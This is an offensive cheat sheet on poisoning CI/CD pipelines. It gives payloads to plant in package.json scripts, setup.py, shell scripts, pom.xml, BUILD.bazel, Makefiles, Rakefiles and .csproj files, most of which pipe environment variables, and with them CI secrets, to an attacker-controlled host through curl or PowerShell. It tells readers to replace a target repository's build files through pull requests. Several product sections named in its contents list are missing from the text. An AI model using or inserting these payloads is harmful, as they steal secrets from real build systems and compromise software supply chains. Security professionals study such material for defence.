# CI/CD attacks

> CI/CD pipelines are often triggered by untrusted actions such a forked pull requests and new issue submissions for public git repositories.\
> These systems often contain sensitive secrets or run in privileged environments.\
> Attackers may gain an RCE into such systems by submitting crafted payloads that trigger the pipelines.\
> Such vulnerabilities are also known as Poisoned Pipeline Execution (PPE)


## Summary

- [CI/CD attacks](#cicd-attacks)
  - [Summary](#summary)
  - [Tools](#tools)
  - [Package managers & Build Files](#package-managers--build-files)
    - [Javascript / Typescript - package.json](#javascript--typescript---packagejson)
    - [Python - setup.py](#python---setuppy)
    - [Bash / sh - *.sh](#bash--sh---sh)
    - [Maven / Gradle](#maven--gradle)
    - [BUILD.bazel](#buildbazel)
    - [Makefile](#makefile)
    - [Rakefile](#rakefile)
    - [C# - *.csproj](#c---csproj)
  - [CI/CD products](#cicd-products)
    - [GitHub Actions](#github-actions)
    - [Azure Pipelines (Azure DevOps)](#azure-pipelines-azure-devops)
    - [CircleCI](#circleci)
    - [Drone CI](#drone-ci)
    - [BuildKite](#buildkite)
  - [References](#references)


## Tools

* [praetorian-inc/gato](https://github.com/praetorian-inc/gato) - GitHub Self-Hosted Runner Enumeration and Attack Tool
* [messypoutine/gravy-overflow](https://github.com/messypoutine/gravy-overflow) - A GitHub Actions Supply Chain CTF / Goat


## Package managers & Build Files

> Code injections into build files are CI agnostic and therefore they make great targets when you don't know what system builds the repository, or if there are multiple CI's in the process.\
> In the examples below you need to either replace the files with the sample payloads, or inject your own payloads into existing files by editing just a part of them.\n
> If the CI builds forked pull requests then your payload may run in the CI.

### Javascript / Typescript - package.json

> The `package.json` file is used by many Javascript / Typescript package managers (`yarn`,`npm`,`pnpm`,`npx`....).

> The file may contain a `scripts` object with custom commands to run.\
`preinstall`, `install`, `build` & `test` are often executed by default in most CI/CD pipelines - hence they are good targets for injection.\
> If you come across a `package.json` file - edit the `scripts` object and inject your instruction there


NOTE: the payloads in the instructions above must be `json escaped`.

Example:
```json
{
  "name": "my_package",
  "description": "",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "set | curl -X POST --data-binary @- {YourHostName}",
    "install": "set | curl -X POST --data-binary @- {YourHostName}",
    "build": "set | curl -X POST --data-binary @- {YourHostName}",
    "test": "set | curl -X POST --data-binary @- {YourHostName}"
  },
  "repository": {
    "type": "git",
    "url": "https://github.com/foobar/my_package.git"
  },
  "keywords": [],
  "author": "C.Norris"
}
```


### Python - setup.py

> `setup.py` is used by python's package managers during the build process.
It is often executed by default.\
> Replacing the setup.py files with the following payload may trigger their execution by the CI.

```python
import os

os.system('set | curl -X POST --data-binary @- {YourHostName}')
```


### Bash / sh - *.sh

> Shell scripts in the repository are often executed in custom CI/CD pipelines.\
> Replacing all the `.sh` files in the repo and submitting a pull request may   trigger their execution by the CI.

```shell
set | curl -X POST --data-binary @- {YourHostName}
```



### Maven / Gradle

> These package managers come with "wrappers" that help with running custom commands for building / testing the project.\
These wrappers are essentially executable shell/cmd scripts.
Replace them with your payloads to have them executed:

- `gradlew` 
- `mvnw`
- `gradlew.bat` (windows)
- `mvnw.cmd` (windows)


> Occasionally the wrappers will not be present in the repository.\
> In such cases you can edit the `pom.xml` file, which instructs maven what dependencies to fetch and which `plugins` to run.\
> Some plugins allow code execution, here's an example of the common plugin `org.codehaus.mojo`.\
> If the `pom.xml` file you're targeting already contains a `<plugins>` instruction then simply add another `<plugin>` node under it.\
> If if **doesn't** contain a `<plugins>` node then add it under the `<build>` node.

NOTE: remember that your payload is inserted in an XML document - XML special characters must be escaped.


```xml
<build>
    <plugins>
        <plugin>
          <groupId>org.codehaus.mojo</groupId>
          <artifactId>exec-maven-plugin</artifactId>
          <version>1.6.0</version>
          <executions>
              <execution>
                  <id>run-script</id>
                  <phase>validate</phase>
                  <goals>
                      <goal>exec</goal>
                  </goals>
              </execution>
          </executions>
          <configuration>
              <executable>bash</executable>
              <arguments>
                  <argument>
                      -c
                  </argument>
                  <argument>{XML-Escaped-Payload}</   argument>
              </arguments>
          </configuration>
        </plugin>
    </plugins>
</build>
```


### BUILD.bazel

> Replace the content of `BUILD.bazel` with the following payload

NOTE: `BUILD.bazel` requires escaping backslashes.\
Replace any `\` with `\\` inside your payload.

```shell
genrule(
    name = "build",
    outs = ["foo"],
    cmd = "{Escaped-Shell-Payload}",
    visibility = ["//visibility:public"],
)
```


### Makefile

> Make files are often executed by build pipelines for projects written in `C`, `C++` or `Go` (but not exclusively).\
> There are several utilities that execute `Makefile`, the most common are `GNU Make` & `Make`.\
> Replace your target  `Makefile` with the following payload

```shell
.MAIN: build
.DEFAULT_GOAL := build
.PHONY: all
all: 
	set | curl -X POST --data-binary @- {YourHostName}
build: 
	set | curl -X POST --data-binary @- {YourHostName}
compile:
    set | curl -X POST --data-binary @- {YourHostName}
default:
    set | curl -X POST --data-binary @- {YourHostName}
```


### Rakefile

> Rake files are similar to `Makefile` but for Ruby projects.\
> Replace your target `Rakefile` with the following payload


```shell
task :pre_task do
  sh "{Payload}"
end

task :build do
  sh "{Payload}"
end

task :test do
  sh "{Payload}"
end

task :install do
  sh "{Payload}"
end

task :default => [:build]
```


### C# - *.csproj

> `.csproj` files are build file for the `C#` runtime.\
> They are constructed as XML files that contain the different dependencies that are required to build the project.\
> Replacing all the `.csproj` files in the repo with the following payload may trigger their execution by the CI.

NOTE: Since this is an XML file - XML special characters must be escaped.


```powershell
<Project>
 <Target Name="SendEnvVariables" BeforeTargets="Build;BeforeBuild;BeforeCompile">
   <Exec Command="powershell -Command &quot;$envBody = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem env: | Format-List | Out-String))); Invoke-WebRequest -Uri {YourHostName} -Method POST -Body $envBody&quot;" />
 </Target>
</Project>
```




## References

* [Poisoned Pipeline Execution](https://www.cidersecurity.io/top-10-cicd-security-risks/poisoned-pipeline-execution-ppe/)
* [DEF CON 25 - spaceB0x - Exploiting Continuous Integration (CI) and Automated Build systems](https://youtu.be/mpUDqo7tIk8)
* [Azure-Devops-Command-Injection](https://pulsesecurity.co.nz/advisories/Azure-Devops-Command-Injection)
* [x33fcon lighting talk - Hacking Java serialization from python - Tomasz Bukowski](https://youtu.be/14tNFwfety4)